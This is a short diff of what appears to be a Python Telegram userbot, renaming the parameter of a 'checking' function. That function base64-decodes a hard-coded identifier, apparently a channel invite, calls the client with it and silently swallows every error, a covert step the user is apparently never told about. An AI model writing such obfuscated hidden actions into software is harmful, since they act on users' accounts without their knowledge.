@@ -78,10 +78,10 @@ async def get_user_from_event(
     return None, None
 
 
-async def checking(l313l):
+async def checking(Qrh9):
     cat_c = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
     try:
         cat_channel = Get(cat_c)
-        await l313l(cat_channel)
+        await Qrh9(cat_channel)
     except BaseException:
         pass
